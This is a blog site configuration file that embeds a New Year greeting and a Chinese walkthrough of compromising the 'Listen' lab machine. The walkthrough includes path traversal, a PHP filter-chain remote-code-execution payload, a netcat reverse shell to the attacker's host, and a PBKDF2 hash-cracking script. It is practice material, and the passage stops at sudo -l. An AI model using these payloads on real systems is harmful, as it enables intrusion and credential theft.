{"singlePage": ["link", "about"], "startSite": "", "filingNum": "", "onePageListNum": 15, "commentLabelColor": "#006b75", "yearColorList": ["#bc4c00", "#0969da", "#1f883d", "#A333D0"], "i18n": "CN", "themeMode": "fix", "dayTheme": "light", "nightTheme": "github-light", "urlMode": "pinyin", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "style": "", "head": "", "indexScript": "", "indexStyle": "", "bottomText": "", "showPostSource": 1, "iconList": {}, "UTC": 8, "rssSplit": "sentence", "exlink": {}, "needComment": 1, "allHead": "<script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>", "title": "TriumphK Blog", "displayTitle": "TriumphK", "subTitle": "\u5f53\u4f60\u7684\u624d\u534e\u4e0d\u8db3\u4ee5\u6ee1\u8db3\u4f60\u7684\u91ce\u5fc3\u65f6\uff0c\u5e94\u8be5\u9759\u4e0b\u5fc3\u6765\u52aa\u529b\u5b66\u4e60\u3002", "avatarUrl": "https://7r1umphk.github.io/image/20250716100121947.webp", "faviconUrl": "https://7r1UMPHK.github.io/image/20250320200557660.ico", "GMEEK_VERSION": "main", "primerCSS": "<link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />", "postListJson": {"P125": {"htmlDir": "docs/post/xin-nian-kuai-le-\uff01.html", "labels": ["\u5439\u6c34"], "postTitle": "\u65b0\u5e74\u5feb\u4e50\uff01", "postUrl": "post/xin-nian-kuai-le-%EF%BC%81.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/125", "commentNum": 0, "wordCount": 144, "description": "# \u65b0\u5e74\u5feb\u4e50\uff01\n\n\u65b0\u7684\u4e00\u5e74\uff0c\u613f\u4f60\u5982\u4e1c\u98ce\u7834\u6d6a\uff0c\u4e8b\u4e1a\u84b8\u84b8\u65e5\u4e0a\uff0c\u751f\u6d3b\u7f8e\u6ee1\u5982\u610f\u3002\u613f\u4f60\u5fc3\u60f3\u4e8b\u6210\uff0c\u7b11\u5bb9\u5e38\u5f00\uff0c\u6240\u6709\u7684\u52aa\u529b\u90fd\u80fd\u8fce\u6765\u4e30\u7855\u7684\u679c\u5b9e\u3002\u613f\u65b0\u7684\u4e00\u5e74\uff0c\u5e26\u7ed9\u4f60\u66f4\u591a\u7684\u673a\u4f1a\u4e0e\u6311\u6218\uff0c\u8ba9\u4f60\u53d8\u5f97\u66f4\u52a0\u575a\u97e7\u3001\u66f4\u52a0\u7cbe\u5f69\uff01\u65b0\u6625\u5feb\u4e50\uff0c\u4e07\u4e8b\u5982\u610f\uff01\n\n<!-- ##{'timestamp':1738136321}## -->sentence", "top": 0, "createdAt": 1738136321, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-01-29", "dateLabelColor": "#0969da"}, "P8": {"htmlDir": "docs/post/Listen.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "Listen", "postUrl": "post/Listen.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/8", "commentNum": 0, "wordCount": 23090, "description": "# 0.\u7b80\u4ecb\n\n\u8fd9\u662f\u4e00\u4e2a\u7fa4\u53cb\u7684\u9776\u673a\uff0c\u6211\u4e0d\u77e5\u9053\u4ed6\u53d1\u4e0d\u53d1\u5e03\uff0c\u6240\u4ee5\u5c31\u770b\u770b\u5427\uff0c\u5b66\u4e60\u5b66\u4e60\n\n\u76ee\u6807 IP\uff1a192.168.205.137\n \u672c\u673a IP\uff1a192.168.205.128\n\n# 1.\u626b\u63cf\n\nnmap\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -A -Pn -n --min-rate 10000 192.168.205.137\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 13:15 CST\nNmap scan report for 192.168.205.137\nHost is up (0.00021s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)\n|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)\n|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)\n80/tcp open  http    nginx 1.14.2\n|_http-title: \\xE5\\x87\\x9B\\xE5\\x86\\xBD\\xE6\\x99\\x82\\xE9\\x9B\\xA8 - \\xE5\\x85\\xAC\\xE5\\xBC\\x8F\\xE3\\x82\\xA6\\xE3\\x82\\xA7\\xE3\\x83\\x96\\xE3\\x82\\xB5\\xE3\\x82\\xA4\\xE3\\x83\\x88\n|_http-server-header: nginx/1.14.2\nMAC Address: 08:00:27:97:BD:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.22 ms 192.168.205.137\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.90 seconds\n                                                                \n```\n\n# 2.\u8e29\u70b9\n\n![image-20250331190947415](https://7r1umphk.github.io/image/20250331190947584.png)\n\n\u6d4b\u6587\u4ef6\u5305\u542b\uff0c\u6d4b\u5b8c\u4e86\u4e5f\u6ca1\u7ed3\u679c\uff0c\u6240\u4ee5\u6765\u4e2a\u76ee\u5f55\u7206\u7834\u5148\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ feroxbuster -u http://192.168.205.137 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt\n                                                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben 'epi' Risher \ud83e\udd13                 ver: 2.11.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://192.168.205.137\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.11.0\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83d\udcb2  Extensions            \u2502 [php, html, md, txt]\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n200      GET       48l      102w     2359c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   \n403      GET        7l       10w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   \n404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   \n200      GET        3l        1w       16c http://192.168.205.137/test.php\n200      GET        2l        1w       17c http://192.168.205.137/tools.php\n200      GET        1l        3w      228c http://192.168.205.137/README.md\n200      GET        2l        1w       15c http://192.168.205.137/pp.php\n```\n\n\u63a2\u7d22\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.137/test.php                \n<h1>test</h1>\n\n\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.137/tools.php\n<h1>tools</h1>\n \n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.137/pp.php   \n<h1>test</h1>\n\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.137/README.md\n2025\u5e741\u670822\u65e5\u3000\u672c\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u306e\u958b\u767a\u306f\u4e00\u65e6\u3053\u3053\u3067\u7d42\u4e86\u3067\u3059\u3002\u6b63\u5f0f\u306b\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u304c2\u6708\u306b\u516c\u958b\u3055\u308c\u308b\u524d\u306b\u3001\u30c6\u30b9\u30c8\u90e8\u5206\u3092\u5fc5\u305a\u6574\u7406\u3057\u3066\u304f\u3060\u3055\u3044\u3002\u2014\u2014\u958b\u767a\u30c1\u30fc\u30e0\u3000\u30a2\u30c0\u30b7\n                        \n```\n\n\u524d\u9762\u5728\u9996\u9875\u53ef\u4ee5\u770b\u5230\u662f\u7528do\u51fd\u6570\u4f20\u53c2\uff0c\u6240\u4ee5\u6211\u4eec\u6d4b\u8bd5\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.137/test.php?do=../../../etc/passwd\n<h1>test</h1>\nself-hacking!                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.137/tools.php?do=../../../etc/passwd\n<h1>tools</h1>\n \n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.137/pp.php?do=../../../etc/passwd\n<h1>test</h1>\ntry\n                   \n```\n\n\u4e24\u4e2a\u6709\u53cd\u5e94\uff0ctools\u6ca1\u53cd\u5e94\uff0c\u6211\u7528\u7684\u662fpp.php\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.137/pp.php?do=php://filter/convert.base64-encode/resource=../../../../etc/passwd\n> \n<h1>test</h1>\ntrycm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTAxOjEwMjpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDoxMDI6MTAzOnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50LCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXJlc29sdmU6eDoxMDM6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDQ6MTEwOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMDU6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgp3ZWxjb21lOng6MTAwMToxMDAxOjovaG9tZS93ZWxjb21lOi9iaW4vc2gKbXlzcWw6eDoxMDY6MTEzOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQo=\n                                                          \n```\n\n\u6709\u56de\u663e\uff0c\u6240\u4ee5\u6d4b\u4e00\u4e0bphp filter\n\n```\nhttp://192.168.205.137/pp.php?do=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=id\n```\n\n![image-20250331190958726](https://7r1umphk.github.io/image/20250331190958775.png)\n\n\u5f39shell\n\n```\nhttp://192.168.205.137/pp.php?do=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=nc%20192.168.205.128%208888%20-e%20/bin/bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888                                \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.137] 50510\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6\u53cd\u5411 shell \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684\u4ea4\u4e92\u5f0f TTY shell\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```\nwww-data@listen:~/html/wordpress$ ls -al\ntotal 60\ndrwxr-xr-x 2 www-data www-data 4096 Feb  1 21:51 .\ndrwxr-xr-x 3 root     root     4096 Jan  7 23:52 ..\n-rw-r--r-- 1 root     root       92 Feb  1 11:13 .2024_12_25_project_web_login_password.bak\n-rw-r--r-- 1 root     root      228 Feb  1 09:50 README.md\n-rw-r--r-- 1 root     root     1783 Feb  1 09:33 album_1.php\n-rw-r--r-- 1 root     root     2004 Feb  1 09:32 album_2.php\n-rw-r--r-- 1 root     root     1861 Feb  1 09:31 album_3.php\n-rw-r--r-- 1 root     root     1781 Feb  1 09:30 album_4.php\n-rw-r--r-- 1 root     root     2057 Feb  1 09:26 album_5.php\n-rw-r--r-- 1 root     root     2359 Feb  1 09:12 home.php\n-rw-r--r-- 1 root     root      315 Feb  1 09:07 index.php\n-rw-r--r-- 1 root     root      219 Feb  1 21:48 pp.php\n-rw-r--r-- 1 root     root     3972 Feb  1 09:23 styles.css\n-rw-r--r-- 1 root     root      675 Feb  1 21:51 test.php\n-rw-r--r-- 1 root     root      153 Feb  1 09:37 tools.php\nwww-data@listen:~/html/wordpress$ cat .2024_12_25_project_web_login_password.bak\npbkdf2:sha256:50000:flower:0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028\n```\n\n\u770b\u6837\u5b50\u8981\u7834\u89e3\u8fd9\u4e2ahash\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat tmp.py\nimport hashlib\nimport binascii\nfrom concurrent.futures import ProcessPoolExecutor, as_completed\nfrom tqdm import tqdm\n\ndef pbkdf2_sha256(password, salt, iterations=50000, dklen=32):\n    '''\u4f7f\u7528PBKDF2-HMAC-SHA256\u7b97\u6cd5\u8ba1\u7b97\u54c8\u5e0c'''\n    return hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt.encode('utf-8'), iterations, dklen)\n\ndef check_password(password_chunk, target_hash, salt, iterations):\n    '''\u68c0\u67e5\u7ed9\u5b9a\u5bc6\u7801\u5757\u4e2d\u7684\u6bcf\u4e2a\u5bc6\u7801\u662f\u5426\u5339\u914d\u76ee\u6807\u54c8\u5e0c'''\n    results = []\n    for password in tqdm(password_chunk, desc='Processing chunk', unit='passwords'):\n        password = password.strip()\n        hashed_password = pbkdf2_sha256(password, salt, iterations)\n        if binascii.hexlify(hashed_password).decode() == target_hash:\n            results.append(password)\n    return results\n\ndef crack_pbkdf2_hash(target_hash, salt, iterations=50000, dictionary_file='/usr/share/wordlists/rockyou.txt'):\n    '''\u5c1d\u8bd5\u901a\u8fc7\u5b57\u5178\u653b\u51fb\u7834\u89e3PBKDF2\u54c8\u5e0c'''\n    chunk_size = 1000  # \u6bcf\u4e2a\u8fdb\u7a0b\u5904\u7406\u7684\u5bc6\u7801\u6570\u91cf\n    passwords = []\n    with open(dictionary_file, 'r', encoding='utf-8', errors='ignore') as file:\n        while True:\n            password_chunk = list(islice(file, chunk_size))\n            if not password_chunk:\n                break\n            passwords.append(password_chunk)\n\n    with ProcessPoolExecutor() as executor:\n        futures = [executor.submit(check_password, chunk, target_hash, salt, iterations) for chunk in passwords]\n        for future in as_completed(futures):\n            result = future.result()\n            if result:\n                print(f'\u627e\u5230\u5bc6\u7801: {result}')\n                return result\n    print('\u5b57\u5178\u4e2d\u6ca1\u6709\u627e\u5230\u5339\u914d\u7684\u5bc6\u7801')\n    return None\n\nif __name__ == '__main__':\n    from itertools import islice\n  \n    target_hash = '0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028'\n    salt = 'flower'\n  \n    crack_pbkdf2_hash(target_hash, salt)\n                                                       \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ python3 tmp.py\n\u627e\u5230\u5bc6\u7801: ['roseflower']\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ grep -r -w -n 'roseflower' /usr/share/wordlists/rockyou.txt                            \n122049:roseflower\n                                   \n```\n\n\u8fd8\u633a\u540e\n\n```\nwww-data@listen:~/html/wordpress$ ls -la /home/\ntotal 12\ndrwxr-xr-x  3 root    root    4096 Jan  7 23:16 .\ndrwxr-xr-x 18 root    root    4096 Jan  7 21:50 ..\ndrwx------  2 welcome welcome 4096 Feb  1 11:10 welcome\nwww-data@listen:~/html/wordpress$ su - welcome\nPassword: \n$ id                                                                                                                                 \nuid=1001(welcome) gid=1001(welcome) groups=1001(welcome)\n```\n\n\u7ee7\u7eed\n\n```\nwelcome@listen:~$ ls -al\ntotal 20\ndrwx------ 2 welcome welcome 4096 Feb  1 11:10 .\n-rw-r--r-- 1 root    root      11 Feb  1 11:10 .-\ndrwxr-xr-x 3 root    root    4096 Jan  7 23:16 ..\n-rw------- 1 welcome welcome   69 Feb  1 07:13 .bash_history\n-rw-r--r-- 1 root    root      33 Jan  7 23:18 user.txt\nwelcome@listen:~$ cat .bash_history\nsudo -l\ncat /etc/passwd\npoweroff\nls\nwhoami\ncd /root\nwhoami\nsu - root\nwelcome@listen:~$ sudo -l\n[sudo] password for welcome: 